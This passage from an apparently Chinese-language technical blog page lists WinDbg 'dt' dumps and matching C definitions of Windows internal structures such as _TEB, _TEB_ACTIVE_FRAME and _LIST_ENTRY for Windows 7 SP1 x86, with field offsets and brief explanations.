class="line">   +<span class="number">0x000</span> Flink            : Ptr32 _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x004</span> Blink            : Ptr32 _LIST_ENTRY</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x8 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span>* <span class="title">Flink</span>;</span>                 <span class="comment">//0x0</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span>* <span class="title">Blink</span>;</span>                 <span class="comment">//0x4</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><strong><code>0x000 Flink</code></strong>：双链表的前向指针。</li><li><strong><code>0x004 Blink</code></strong>：双链表的后向指针。</li></ul><h4 id="Wx86ThreadState"><a href="#Wx86ThreadState" class="headerlink" title="_Wx86ThreadState"></a>_Wx86ThreadState</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dt _Wx86ThreadState</span><br><span class="line">ntdll!_Wx86ThreadState</span><br><span class="line">   +<span class="number">0x000</span> CallBx86Eip      : Ptr32 Uint4B</span><br><span class="line">   +<span class="number">0x004</span> DeallocationCpu  : Ptr32 Void</span><br><span class="line">   +<span class="number">0x008</span> UseKnownWx86Dll  : UChar</span><br><span class="line">   +<span class="number">0x009</span> OleStubInvoked   : Char</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0xc bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">Wx86ThreadState</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ULONG* CallBx86Eip;                        <span class="comment">//0x0</span></span><br><span class="line">    VOID* DeallocationCpu;                     <span class="comment">//0x4</span></span><br><span class="line">    UCHAR UseKnownWx86Dll;                     <span class="comment">//0x8</span></span><br><span class="line">    CHAR OleStubInvoked;                       <span class="comment">//0x9</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="TEB-ACTIVE-FRAME"><a href="#TEB-ACTIVE-FRAME" class="headerlink" title="_TEB_ACTIVE_FRAME"></a>_TEB_ACTIVE_FRAME</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dt _TEB_ACTIVE_FRAME</span><br><span class="line">ntdll!_TEB_ACTIVE_FRAME</span><br><span class="line">   +<span class="number">0x000</span> Flags            : Uint4B</span><br><span class="line">   +<span class="number">0x004</span> Previous         : Ptr32 _TEB_ACTIVE_FRAME</span><br><span class="line">   +<span class="number">0x008</span> Context          : Ptr32 _TEB_ACTIVE_FRAME_CONTEXT</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0xc bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">TEB_ACTIVE_FRAME</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ULONG Flags;                                       <span class="comment">//0x0</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">TEB_ACTIVE_FRAME</span>* <span class="title">Previous</span>;</span>                <span class="comment">//0x4</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">TEB_ACTIVE_FRAME_CONTEXT</span>* <span class="title">Context</span>;</span>         <span class="comment">//0x8</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dt _TEB_ACTIVE_FRAME_CONTEXT</span><br><span class="line">ntdll!_TEB_ACTIVE_FRAME_CONTEXT</span><br><span class="line">   +<span class="number">0x000</span> Flags            : Uint4B</span><br><span class="line">   +<span class="number">0x004</span> FrameName        : Ptr32 Char</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x8 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">TEB_ACTIVE_FRAME_CONTEXT</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ULONG Flags;                                       <span class="comment">//0x0</span></span><br><span class="line">    CHAR* FrameName;                                   <span class="comment">//0x4</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="Windows-7-SP1-x86"><a href="#Windows-7-SP1-x86" class="headerlink" title="Windows 7 SP1 x86"></a>Windows 7 SP1 x86</h3><h4 id="TEB-2"><a href="#TEB-2" class="headerlink" title="_TEB"></a>_TEB</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">001</span>&gt; dt _TEB</span><br><span class="line">ntdll!_TEB</span><br><span class="line">   +<span class="number">0x000</span> NtTib            : _NT_TIB</span><br><span class="line">   +<span class="number">0x01c</span> EnvironmentPointer : Ptr32 Void</span><br><span class="line">   +<span class="number">0x020</span> ClientId         : _CLIENT_ID</span><br><span class="line">   +<span class="number">0x028</span> ActiveRpcHandle  : Ptr32 Void</span><br><span class="line">   +<span class="number">0x02c</span> ThreadLocalStoragePointer : Ptr32 Void</span><br><span class="line">   +<span class="number">0x030</span> ProcessEnvironmentBlock : Ptr32 _PEB</span><br><span class="line">   +<span class="number">0x034</span> LastErrorValue   : Uint4B</span><br><span class="line">   +<span class="number">0x038</span> CountOfOwnedCriticalSections : Uint4B</span><br><span class="line">   +<span class="number">0x03c</span> CsrClientThread  : Ptr32 Void</span><br><span class="line">   +<span class="number">0x040</span> Win32ThreadInfo  : Ptr32 Void</span><br><span class="line">   +<span class="number">0x044</span> User32Reserved   : [<span class="number">26</span>] Uint4B</span><br><span class="line">   +<span class="number">0x0ac</span> UserReserved     : [<span class="number">5</span>] Uint4B</span><br><span class="line">   +<span class="number">0x0c0</span> WOW32Reserved    : Ptr32 Void</span><br><span class="line">   +<span class="number">0x0c4</span> CurrentLocale    : Uint4B</span><br><span class="line">   +<span class="number">0x0c8</span> FpSoftwareStatusRegister : Uint4B</span><br><span class="line">   +<span class="number">0x0cc</span> SystemReserved1  : [<span class="number">54</span>] Ptr32 Void</span><br><span class="line">   +<span class="number">0x1a4</span> ExceptionCode    : Int4B</span><br><span class="line">   +<span class="number">0x1a8</span> ActivationContextStackPointer : Ptr32 _ACTIVATION_CONTEXT_STACK</span><br><span class="line">   +<span class="number">0x1ac</span> SpareBytes       : [<span class="number">36</span>] UChar</span><br><span class="line">   +<span class="number">0x1d0</span> TxFsContext      : Uint4B</span><br><span class="line">   +<span class="number">0x1d4</span> GdiTebBatch      : _GDI_TEB_BATCH</span><br><span class="line">   +<span class="number">0x6b4</span> RealClientId     : _CLIENT_ID</span><br><span class="line">   +<span class="number">0x6bc</span> GdiCachedProcessHandle : Ptr32 Void</span><br><span class="line">   +<span class="number">0x6c0</span> GdiClientPID     : Uint4B</span><br><span class="line">   +<span class="number">0x6c4</span> GdiClientTID     : Uint4B</span><br><span class="line">   +<span class="number">0x6c8</span> GdiThreadLocalInfo : Ptr32 Void</span><br><span class="line">   +<span class="number">0x6cc</span> Win32ClientInfo  : [<span class="number">62</span>] Uint4B</span><br><span class="line">   +<span class="number">0x7c4</span> glDispatchTable  : [<span class="number">233</span>] Ptr32 Void</span><br><span class="line">   +<span class="number">0xb68</span> glReserved1      : [<span class="number">29</span>] Uint4B</span><br><span class="line">   +<span class="number">0xbdc</span> glReserved2      : Ptr32 Void</span><br><span class="line">   +<span class="number">0xbe0</span> glSectionInfo    : Ptr32 Void</span><br><span class="line">   +<span class="number">0xbe4</span> glSection        : Ptr32 Void</span><br><span class="line">   +<span class="number">0xbe8</span> glTable          : Ptr32 Void</span><br><span class="line">   +<span class="number">0xbec</span> glCurrentRC      : Ptr32 Void</span><br><span class="line">   +<span class="number">0xbf0</span> glContext        : Ptr32 Void</span><br><span class="line">   +<span class="number">0xbf4</span> LastStatusValue  : Uint4B</span><br><span class="line">   +<span class="number">0xbf8</span> StaticUnicodeString : _UNICODE_STRING</span><br><span class="line">   +<span class="number">0xc00</span> StaticUnicodeBuffer : [<span class="number">261</span>] Wchar</span><br><span class="line">   +<span class="number">0xe0c</span> DeallocationStack : Ptr32 Void</span><br><span class="line">   +<span class="number">0xe10</span> TlsSlots         : [<span class="number">64</span>] Ptr32 Void</span><br><span class="line">   +<span class="number">0xf10</span> TlsLinks         : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0xf18</span> Vdm              : Ptr32 Void</span><br><span class="line">   +<span class="number">0xf1c</span> ReservedForNtRpc : Ptr32 Void</span><br><span class="line">   +<span class="number">0xf20</span> DbgSsReserved    : [<span class="number">2</span>] Ptr32 Void</span><br><span class="line">   +<span class="number">0xf28</span> HardErrorMode    : Uint4B</span><br><span class="line">   +<span class="number">0xf2c</span> Instrumentation  : [<span class="number">9</span>] Ptr32 Void</span><br><span class="line">   +<span class="number">0xf50</span> ActivityId       : _GUID</span><br><span class="line">   +<span class="number">0xf60</span> SubProcessTag    : Ptr32 Void</span><br><span class="line">   +<span class="number">0xf64</span> EtwLocalData     : Ptr32 Void</span><br><span class="line">   +<span class="number">0xf68</span> EtwTraceData     : Ptr32 Void</span><br><span class="line">   +<span class="number">0xf6c</span> WinSockData      : Ptr32 Void</span><br><span class="line">   +<span class="number">0xf70</span> GdiBatchCount    : Uint4B</span><br><span class="line">   +<span class="number">0xf74</span> CurrentIdealProcessor : _PROCESSOR_NUMBER</span><br><span class="line">   +<span class="number">0xf74</span> IdealProcessorValue : Uint4B</span><br><span class="line">   +<span class="number">0xf74</span> ReservedPad0     : UChar</span><br><span class="line">   +<span class="number">0xf75</span> ReservedPad1     : UChar</span><br><span class="line">   +<span class="number">0xf76</span> ReservedPad2     : UChar</span><br><span class="line">   +<span class="number">0xf77</span> IdealProcessor   : UChar</span><br><span class="line">   +<span class="number">0xf78</span> GuaranteedStackBytes : Uint4B</span><br><span class="line">   +<span class="number">0xf7c</span> ReservedForPerf  : Ptr32 Void</span><br><span class="line">   +<span class="number">0xf80</span> ReservedForOle   : Ptr32 Void</span><br><span class="line">   +<span class="number">0xf84</span> WaitingOnLoaderLock : Uint4B</span><br><span class="line">   +<span class="number">0xf88</span> SavedPriorityState : Ptr32 Void</span><br><span class="line">   +<span class="number">0xf8c</span> SoftPatchPtr1    : Uint4B</span><br><span class="line">   +<span class="number">0xf90</span> ThreadPoolData   : Ptr32 Void</span><br><span class="line">   +<span class="number">0xf94</span> TlsExpansionSlots : Ptr32 Ptr32 Void</span><br><span class="line">   +<span class="number">0xf98</span> MuiGeneration    : Uint4B</span><br><span class="line">   +<span class="number">0xf9c</span> IsImpersonating  : Uint4B</span><br><span class="line">   +<span class="number">0xfa0</span> NlsCache         : Ptr32 Void</span><br><span class="line">   +<span class="number">0xfa4</span> pShimData        : Ptr32 Void</span><br><span class="line">   +<span class="number">0xfa8</span> HeapVirtualAffinity : Uint4B</span><br><span class="line">   +<span class="number">0xfac</span> CurrentTransactionHandle : Ptr32 Void</span><br><span class="line">   +<span class="number">0xfb0</span> ActiveFrame      : Ptr32 _TEB_ACTIVE_FRAME</span><br><span class="line">   +<span class="number">0xfb4</span> FlsData          : Ptr32 Void</span><br><span class="line">   +<span class="number">0xfb8</span> PreferredLanguages : Ptr32 Void</span><br><span class="line">   +<span class="number">0xfbc</span> UserPrefLanguages : Ptr32 Void</span><br><span class="line">   +<span class="number">0xfc0</span> MergedPrefLanguages : Ptr32 Void</span><br><span class="line">   +<span class="number">0xfc4</span> MuiImpersonation : Uint4B</span><br><span class="line">   +<span class="number">0xfc8</span> CrossTebFlags    : Uint2B</span><br><span class="line">   +<span class="number">0xfc8</span> SpareCrossTebBits : Pos <span class="number">0</span>, <span class="number">16</span> Bits</span><br><span class="line">   +<span class="number">0xfca</span> SameTebFlags     : Uint2B</span><br><span class="line">   +<span class="number">0xfca</span> SafeThunkCall    : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0xfca</span> InDebugPrint     : Pos <span class="number">1</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0xfca</span> HasFiberData     : Pos <span class="number">2</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0xfca</span> SkipThreadAttach : Pos <span class="number">3</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0xfca</span> WerInShipAssertCode : Pos <span class="number">4</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0xfca</span> RanProcessInit   : Pos <span class="number">5</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0xfca</span> ClonedThread     : Pos <span class="number">6</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0xfca</span> SuppressDebugMsg : Pos <span class="number">7</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0xfca</span> DisableUserStackWalk : Pos <span class="number">8</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0xfca</span> RtlExceptionAttached : Pos <span class="number">9</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0xfca</span> InitialThread    : Pos <span class="number">10</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0xfca</span> SpareSameTebBits : Pos <span class="number">11</span>, <span class="number">5</span> Bits</span><br><span class="line">   +<span class="number">0xfcc</span> TxnScopeEnterCallback : Ptr32 Void</span><br><span class="line">   +<span class="number">0xfd0</span> TxnScopeExitCallback : Ptr32 Void</span><br><span class="line">   +<span class="number">0xfd4</span> TxnScopeContext  : Ptr32 Void</span><br><span class="line">   +<span class="number">0xfd8</span> LockCount        : Uint4B</span><br><span class="line">   +<span class="number">0xfdc</span> SpareUlong0      : Uint4B</span><br><span class="line">   +<span class="number">0xfe0</span> ResourceRetValue : Ptr32 Void</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0xfe4 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">TEB</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span> <span class="title">NtTib</span>;</span>                                            <span class="comment">//0x0</span></span><br><span class="line">    VOID* EnvironmentPointer;                                        <span class="comment">//0x1c</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">CLIENT_ID</span> <span class="title">ClientId</span>;</span>                                      <span class="comment">//0x20</span></span><br><span class="line">    VOID* ActiveRpcHandle;                                           <span class="comment">//0x28</span></span><br><span class="line">    VOID* ThreadLocalStoragePointer;                                 <span class="comment">//0x2c</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">PEB</span>* <span class="title">ProcessEnvironmentBlock</span>;</span>                            <span class="comment">//0x30</span></span><br><span class="line">    ULONG LastErrorValue;                                            <span class="comment">//0x34</span></span><br><span class="line">    ULONG CountOfOwnedCriticalSections;                              <span class="comment">//0x38</span></span><br><span class="line">    VOID* CsrClientThread;                                           <span class="comment">//0x3c</span></span><br><span class="line">    VOID* Win32ThreadInfo;                                           <span class="comment">//0x40</span></span><br><span class="line">    ULONG User32Reserved[<span class="number">26</span>];                                        <span class="comment">//0x44</span></span><br><span class="line">    ULONG UserReserved[<span class="number">5</span>];                                           <span class="comment">//0xac</span></span><br><span class="line">    VOID* WOW32Reserved;                                             <span class="comment">//0xc0</span></span><br><span class="line">    ULONG CurrentLocale;                                             <span class="comment">//0xc4</span></span><br><span class="line">    ULONG FpSoftwareStatusRegister;                                  <span class="comment">//0xc8</span></span><br><span class="line">    VOID* SystemReserved1[<span class="number">54</span>];                                       <span class="comment">//0xcc</span></span><br><span class="line">    LONG ExceptionCode;                                              <span class="comment">//0x1a4</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">ACTIVATION_CONTEXT_STACK</span>* <span class="title">ActivationContextStackPointer</span>;</span> <span class="comment">//0x1a8</span></span><br><span class="line">    UCHAR SpareBytes[<span class="number">36</span>];                                            <span class="comment">//0x1ac</span></span><br><span class="line">    ULONG TxFsContext;                                               <span class="comment">//0x1d0</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">GDI_TEB_BATCH</span> <span class="title">GdiTebBatch</span>;</span>                               <span class="comment">//0x1d4</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">CLIENT_ID</span> <span class="title">RealClientId</span>;</span>                                  <span class="comment">//0x6b4</span></span><br><span class="line">    VOID* GdiCachedProcessHandle;                                    <span class="comment">//0x6bc</span></span><br><span class="line">    ULONG GdiClientPID;                                              <span class="comment">//0x6c0</span></span><br><span class="line">    ULONG GdiClientTID;                                              <span class="comment">//0x6c4</span></span><br><span class="line">    VOID* GdiThreadLocalInfo;                                        <span class="comment">//0x6c8</span></span><br><span class="line">    ULONG Win32ClientInfo[<span class="number">62</span>];                                       <span class="comment">//0x6cc</span></span><br><span class="line">    VOID* glDispatchTable[<span class="number">233</span>];                                      <span class="comment">//0x7c4</span></span><br><span class="line">    ULONG glReserved1[<span class="number">29</span>];                                           <span class="comment">//0xb68</span></span><br><span class="line">    VOID* glReserved2;                                               <span class="comment">//0xbdc</span></span><br><span class="line">    VOID* glSectionInfo;                                             <span class="comment">//0xbe0</span></span><br><span class="line">    VOID* glSection;                                                 <span class="comment">//0xbe4</span></span><br><span class="line">    VOID* glTable;                                                   <span class="comment">//0xbe8</span></span><br><span class="line">    VOID* glCurrentRC;                                               <span class="comment">//0xbec</span></span><br><span class="line">    VOID* glContext;                                                 <span class="comment">//0xbf0</span></span><br><span class="line">    ULONG LastStatusValue;                                           <span class="comment">//0xbf4</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> <span class="title">StaticUnicodeString</span>;</span>                      <span class="comment">//0xbf8</span></span><br><span class="line">    WCHAR StaticUnicodeBuffer[<span class="number">261</span>];                                  <span class="comment">//0xc00</span></span><br><span class="line">    VOID* DeallocationStack;                                         <span class="comment">//0xe0c</span></span><br><span class="line">    VOID* TlsSlots[<span class="number">64</span>];                                              <span class="comment">//0xe10</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">TlsLinks</span>;</span>                                     <span class="comment">//0xf10</span></span><br><span class="line">    VOID* Vdm;                                                       <span class="comment">//0xf18</span></span><br><span class="line">    VOID* ReservedForNtRpc;                                          <span class="comment">//0xf1c</span></span><br><span class="line">    VOID* DbgSsReserved[<span class="number">2</span>];                                          <span class="comment">//0xf20</span></span><br><span class="line">    ULONG HardErrorMode;                                             <span class="comment">//0xf28</span></span><br><span class="line">    VOID* Instrumentation[<span class="number">9</span>];                                        <span class="comment">//0xf2c</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">GUID</span> <span class="title">ActivityId</span>;</span>                                         <span class="comment">//0xf50</span></span><br><span class="line">    VOID* SubProcessTag;                                             <span class="comment">//0xf60</span></span><br><span class="line">    VOID* EtwLocalData;                                              <span class="comment">//0xf64</span></span><br><span class="line">    VOID* EtwTraceData;                                              <span class="comment">//0xf68</span></span><br><span class="line">    VOID* WinSockData;                                               <span class="comment">//0xf6c</span></span><br><span class="line">    ULONG GdiBatchCount;                                             <span class="comment">//0xf70</span></span><br><span class="line">    <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> _<span class="title">PROCESSOR_NUMBER</span> <span class="title">CurrentIdealProcessor</span>;</span>              <span class="comment">//0xf74</span></span><br><span class="line">        ULONG IdealProcessorValue;                                   <span class="comment">//0xf74</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            UCHAR ReservedPad0;                                      <span class="comment">//0xf74</span></span><br><span class="line">            UCHAR ReservedPad1;                                      <span class="comment">//0xf75</span></span><br><span class="line">            UCHAR ReservedPad2;                                      <span class="comment">//0xf76</span></span><br><span class="line">            UCHAR IdealProcessor;                                    <span class="comment">//0xf77</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    ULONG GuaranteedStackBytes;                                      <span class="comment">//0xf78</span></span><br><span class="line">    VOID* ReservedForPerf;                                           <span class="comment">//0xf7c</span></span><br><span class="line">    VOID* ReservedForOle;                                            <span class="comment">//0xf80</span></span><br><span class="line">    ULONG WaitingOnLoaderLock;                                       <span class="comment">//0xf84</span></span><br><span class="line">    VOID* SavedPriorityState;                                        <span class="comment">//0xf88</span></span><br><span class="line">    ULONG SoftPatchPtr1;                                             <span class="comment">//0xf8c</span></span><br><span class="line">    VOID* ThreadPoolData;                                            <span class="comment">//0xf90</span></span><br><span class="line">    VOID** TlsExpansionSlots;                                        <span class="comment">//0xf94</span></span><br><span class="line">    ULONG MuiGeneration;                                             <span class="comment">//0xf98</span></span><br><span class="line">    ULONG IsImpersonating;                                           <span class="comment">//0xf9c</span></span><br><span class="line">    VOID* NlsCache;                                                  <span class="comment">//0xfa0</span></span><br><span class="line">    VOID* pShimData;                                                 <span class="comment">//0xfa4</span></span><br><span class="line">    ULONG HeapVirtualAffinity;                                       <span class="comment">//0xfa8</span></span><br><span class="line">    VOID* CurrentTransactionHandle;                                  <span class="comment">//0xfac</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">TEB_ACTIVE_FRAME</span>* <span class="title">ActiveFrame</span>;</span>                           <span class="comment">//0xfb0</span></span><br><span class="line">    VOID* FlsData;                                                   <span class="comment">//0xfb4</span></span><br><span class="line">    VOID* PreferredLanguages;                                        <span class="comment">//0xfb8</span></span><br><span class="line">    VOID* UserPrefLanguages;                                         <span class="comment">//0xfbc</span></span><br><span class="line">    VOID* MergedPrefLanguages;                                       <span class="comment">//0xfc0</span></span><br><span class="line">    ULONG MuiImpersonation;                                          <span class="comment">//0xfc4</span></span><br><span class="line">    <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">volatile</span> USHORT CrossTebFlags;                               <span class="comment">//0xfc8</span></span><br><span class="line">        USHORT SpareCrossTebBits:<span class="number">16</span>;                                 <span class="comment">//0xfc8</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">        USHORT SameTebFlags;                                         <span class="comment">//0xfca</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            USHORT SafeThunkCall:<span class="number">1</span>;                                  <span class="comment">//0xfca</span></span><br><span class="line">            USHORT InDebugPrint:<span class="number">1</span>;                                   <span class="comment">//0xfca</span></span><br><span class="line">            USHORT HasFiberData:<span class="number">1</span>;                                   <span class="comment">//0xfca</span></span><br><span class="line">            USHORT SkipThreadAttach:<span class="number">1</span>;                               <span class="comment">//0xfca</span></span><br><span class="line">            USHORT WerInShipAssertCode:<span class="number">1</span>;                            <span class="comment">//0xfca</span></span><br><span class="line">            USHORT RanProcessInit:<span class="number">1</span>;                                 <span class="comment">//0xfca</span></span><br><span class="line">            USHORT ClonedThread:<span class="number">1</span>;                                   <span class="comment">//0xfca</span></span><br><span class="line">            USHORT SuppressDebugMsg:<span class="number">1</span>;                               <span class="comment">//0xfca</span></span><br><span class="line">            USHORT DisableUserStackWalk:<span class="number">1</span>;                           <span class="comment">//0xfca</span></span><br><span class="line">            USHORT RtlExceptionAttached:<span class="number">1</span>;                   